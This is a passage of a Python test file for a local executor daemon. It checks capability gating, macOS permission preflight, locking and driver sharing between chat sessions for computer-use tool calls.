    assert "computer_use" not in meanwhile.payload.capabilities
    assert ("computer_use" in later.payload.capabilities) is installed


async def test_a_mac_start_that_went_on_offers_no_computer_use_until_a_check_passes(
    tmp_path, fake_log, monkeypatch
) -> None:
    """On macOS the start checks the Accessibility and Screen Recording
    grants once it has the driver. One that went on while its look for the
    driver stalled checked nothing, so HELLO leaves computer use out, even
    once the look finds the driver, until a session's check has passed: a
    chat's, here."""
    from autogpt_local_executor import daemon as daemon_module
    from autogpt_local_executor import platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    released, _looks = _stall_the_look(monkeypatch)
    monkeypatch.setattr(daemon_module, "DRIVER_PREFLIGHT_SECONDS", 0.2, raising=False)
    # The chat's check starts the driver, which a slow machine may take a
    # while to do: its check runs in full here.
    monkeypatch.setattr(handlers_module, "CHILD_DRIVER_WAIT_SECONDS", 60.0, raising=False)
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    try:
        await asyncio.wait_for(parent._preflight_or_raise(), timeout=30)
        released.set()
        unchecked = await asyncio.wait_for(parent._build_hello(), timeout=30)
        await asyncio.wait_for(child._preflight_or_raise(), timeout=30)
        checked = await asyncio.wait_for(parent._build_hello(), timeout=30)
    finally:
        released.set()
        await parent._computer_handler.close()

    assert "files" in unchecked.payload.capabilities
    assert "computer_use" not in unchecked.payload.capabilities
    assert "computer_use" in checked.payload.capabilities


async def test_computer_tool_calls_need_the_granted_capability(tmp_path, fake_log) -> None:
    daemon = _daemon(tmp_path)
    daemon._granted_capabilities = frozenset({"files"})

    response = await daemon._handle(_call("click", {"pid": 1}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CAPABILITY_NOT_GRANTED
    assert _records(fake_log, "call") == []


async def test_a_call_queued_behind_another_chats_call_gives_up_unstarted(
    tmp_path, fake_log
) -> None:
    """The daemon waited for the computer with no bound, so a call queued
    behind another chat's started whenever its turn came."""
    daemon = _daemon(tmp_path)
    daemon._granted_capabilities = frozenset({"files", "computer_use"})
    daemon._semaphore = asyncio.Semaphore(4)
    sent: list[Any] = []

    async def send_frame(_ws: Any, frame: Any) -> bool:
        sent.append(frame)
        return True

    daemon._send_frame = send_frame  # type: ignore[method-assign]
    try:
        # Another chat's call holds the computer for longer than this one may wait.
        async with daemon._computer_use_lock:
            await asyncio.wait_for(
                daemon._dispatch(None, _call("click", {"pid": 1}, timeout_seconds=1)), 30
            )
    finally:
        await daemon._computer_handler.close()

    [frame] = sent
    assert isinstance(frame, ErrorMessage)
    assert frame.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert frame.payload.details["started"] is False
    assert _records(fake_log, "call") == []


async def test_a_child_session_starts_while_another_chats_call_holds_the_driver(
    tmp_path, fake_log, monkeypatch
) -> None:
    """On macOS every session checked the grants through the shared driver,
    within 30 s. A call from another chat that held the driver longer failed
    the new session's preflight, so it ended after activation had reported it
    ready."""
    from autogpt_local_executor import daemon as daemon_module
    from autogpt_local_executor import platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    monkeypatch.setattr(daemon_module, "PERMISSION_CHECK_SECONDS", 0.3)
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    driver = parent._computer_handler.driver
    try:
        slow = asyncio.create_task(driver.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(250):
            if _records(fake_log, "call"):
                break
            await asyncio.sleep(0.02)

        await child._preflight_computer_use()  # doesn't raise
        result = await slow
        # The parent, which owns the driver, still fails a check that can't run.
        busy = asyncio.create_task(driver.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(250):
            if len(_records(fake_log, "call")) >= 2:
                break
            await asyncio.sleep(0.02)
        with pytest.raises(daemon_module.DaemonPreflightError):
            await parent._preflight_computer_use()
        await busy
    finally:
        await parent._computer_handler.close()

    assert result["content"] == [{"type": "text", "text": "slow"}]
    assert [r["tool"] for r in _records(fake_log, "call")] == ["drag", "drag"]


async def test_the_tool_list_does_not_wait_for_a_running_action(tmp_path, fake_log) -> None:
    """Calls take turns on the one GUI; listing tools touches no window."""
    daemon = _daemon(tmp_path)
    daemon._granted_capabilities = frozenset({"files", "computer_use"})
    try:
        async with daemon._computer_use_lock:
            listed = await asyncio.wait_for(
                daemon._handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts())), 30
            )
    finally:
        await daemon._computer_handler.close()

    assert isinstance(listed, ComputerToolsResponseMessage)


async def test_a_child_session_uses_the_parents_driver(tmp_path, fake_log, monkeypatch) -> None:
    from autogpt_local_executor.daemon import ShimDaemon
    from autogpt_local_executor.session_grants import RootBinding

    parent = _daemon(tmp_path, session_id=None)
    started: list[ShimDaemon] = []

    async def run(self) -> None:
        started.append(self)
        await asyncio.sleep(3600)

    monkeypatch.setattr(ShimDaemon, "run", run)
    binding = RootBinding(
        session_id="child-1",
        allowed_root=tmp_path,
        fingerprint="0" * 64,
        revision=1,
        root_grant="grant",
    )
    try:
        await parent._start_child_session(binding)
        await asyncio.sleep(0)
        [child] = started
        assert child._computer_handler.driver is parent._computer_handler.driver
        assert child._computer_handler._screenshot_rate is parent._computer_handler._screenshot_rate
        assert child._computer_handler.clipboard_writeback is (
            parent._computer_handler.clipboard_writeback
        )
        assert child._computer_handler.session_label != parent._computer_handler.session_label
    finally:
        await parent._shutdown_children()
        await parent._computer_handler.close()
